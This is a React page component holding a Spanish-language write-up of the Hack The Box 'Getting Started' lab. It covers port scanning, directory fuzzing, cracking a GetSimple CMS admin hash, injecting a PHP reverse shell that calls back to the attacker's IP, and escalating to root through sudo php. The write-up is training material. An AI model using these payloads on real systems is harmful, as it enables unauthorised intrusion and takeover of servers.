import React from "react";
import { useImageLightbox } from "@/components/ImageLightbox";

export default function Getting_Starterd_HTB() {
  const { LightboxImage, LightboxOverlay } = useImageLightbox();
  return (
    <>
      <LightboxOverlay />
      <article className="prose prose-invert">
      <h1>Comprobación de Conocimientos — Getting Started (HTB)</h1>
      <br />
      <LightboxImage src="/images/Blog/Miniaturas/Getting_Started.png" alt="Getting Started thumbnail" />
      <br />
      <p>
        <strong>Objetivos:</strong> El primer objetivo de este reto es, una vez comprometido el servidor,
        obtener el contenido de la flag en <code>user.txt</code>. El segundo objetivo es obtener la flag
        en <code>root.txt</code> tras escalar privilegios.
      </p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/ipobjetivo.png" alt="Getting Started thumbnail" />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/Objetivo2.png" alt="Getting Started thumbnail" />
      <br />
      <p>Antes de empezar revisamos un poco lo que nos dice la propia plataforma para que tengamos una guía del orden en que debemos trabajar.</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/Inicio.png" alt="Getting Started thumbnail" />
      <br />
      <h2>Reconocimiento</h2>

      <p>Escaneo inicial con <code>nmap</code>:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 1000 {Ip}`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/nmap1.png" alt="Getting Started thumbnail" />
      <br />
      <p>Parámetros clave:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 1000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />
      <p>Tras el escaneo inicial se detectaron dos puertos abiertos: <code>22</code> y <code>80</code>.</p>
      
      <p>Escaneo más detallado en los puertos 22 y 80:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p22,80 -n -Pn -sCV {Ip}`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/nmap2.png" alt="Getting Started thumbnail" />
      <br />
      <p>Comprobamos versiones de servicios y posibles scripts útiles. Además usamos <code>whatweb</code> y <code>curl</code> para analizar el servicio web:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{"whatweb http://{IP}:80"}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/whatweb.png" alt="Getting Started thumbnail" />
      <br />
      <p>Vamos a echarle un vistazo a la página web:</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/web1.png" alt=""/>
      <br />
      <h2>Investigación del CMS</h2>
      <p>La web usa el CMS <em>GetSimple</em>. Hicimos fuzzing de directorios con <code>gobuster</code>:</p>
      <pre className="rounded bg-muted p-4 overflow-auto">{`gobuster dir -u http://{IP} -w {/path/to/wordlist/}`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/gobuster.png" alt=""/>
      <p>Entre los hallazgos relevantes en <code>/data/other/</code>:</p>
      <br />
      <ul>
        <li><code>website.xml</code></li>
        <li><code>authorization.xml</code> con una API key</li>
        <li><code>plugins.xml</code> indicando plugins instalados</li>
        <li><code>users/admin.xml</code> donde aparece el usuario <code>admin</code> y un hash</li>
      </ul>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/data.png" alt=""/>
      <br />
      <p>El hash encontrado (<code>d033e22ae348aeb5660fc2140aec35850c4da997</code>) se comprobó en servicios como CrackStation y devuelve <code>admin</code>, por lo que probamos credenciales en <code>/admin/</code> y el acceso fue exitoso.</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/hash.png" alt=""/>
      <br />
      <p>Seguimos buscando y obtenemos un panel de autenticación</p>
      <br />
      <LightboxImage  src="/images/Blog/Getting_Started_HTB/admin.png" alt=""/>
      <br />
      <p>Probamos las credenciales que tenemos y para adentro!</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/autenticado.png" alt=""/>
      <br />
      <p>Recopilamos información en el sitio:</p>
      <br />
      <ul>
        <li>GetSimple Version 3.3.15</li>
        <li>Vemos que podemos crear y editar páginas</li>
        <li>Vemos que podemos editar temas y componentes</li>
        <li>Podemos también editar el sitemap</li>
      </ul>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/wapp.png" alt=""/>
      <br />
      <ul>
        <li>Vemos que está hecho con PHP</li>
        <li>Hay que tener en cuenta que tanto las páginas, temas y componentes son archivos PHP, por lo que podemos intentar inyectar instrucciones para ver si el servidor las interpreta.</li>
      </ul>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/component1.png" alt=""/>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/component2.png" alt=""/>
      <br />
      <p>Dado que el servidor nos interpreta la instrucción tenemos ejecución remota de comandos en el servidor. Con lo que debemos intentar lanzarnos una bash a nuestro equipo atacante para trabajar mejor.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`<?php system('php -r \'$sock=fsockopen("10.10.15.64",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''); ?>`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/component3.png" alt=""/>
      <br />
      <p>Nos ponemos en escucha con netcat:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nc -lvnp 4444`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/rshell1.png" alt=""/>
      <br />
      <p>Y hacemos la petición al sitio</p>
      <p>Y vemos que tenemos una terminal /bin/sh/ </p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/rshell2.png" alt=""/>
      <br />
      <p>Lo siguiente que debemos hacer es darle tratamiento a la tty para poder trabajar cómodos:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 -c 'import pty; pty.spawn("/bin/bash")'`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/rshell3.png" alt=""/>
      <br />
      <p>Nos podemos mover en el servidor para encontrar la primera flag</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/flag1.png" alt=""/>
      <br />      
      <p>Vale el siguiente objetivo es escalar privilegios a root para obtener la segunda flag</p>
      <p>Ejecutamos el siguiente comando para ver que comandos podemos ejecutar como root sin necesidad de contraseña:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo -l`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/escalada.png" alt=""/>
      <br />
      <p>Y vemos que podemos ejecutar el comando php sin contraseña, lo siguiente que debemos hacer es buscar algún script con php que nos permita escalar privilegios. Recomiendo este recurso que tiene muchas funciones para escalar privilegios que podemos probar:</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/escalada2.png" alt=""/>
      <br />
      <p>Ponemos php y tocamos en sudo que es lo que tenemos ahora mismo posible ejecutar:</p>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/escalada3.png" alt=""/>
      <br />
      <p>Vale lo que vamos a hacer una pequeña modificación al comando para ejecutarlo de una:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo php -r "system('/bin/bash');"`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/escalada4.png" alt=""/>
      <br />
      <p>Entonces lo que vamos a hacer a continuación es buscar la flag de root.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{
`cd /root 
ls
cat root.txt`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Getting_Started_HTB/escalada5.png" alt=""/>
      <br />
      <p>Tenemos la segunda flag.</p>
    </article>
    </>
  );
}
      <br />
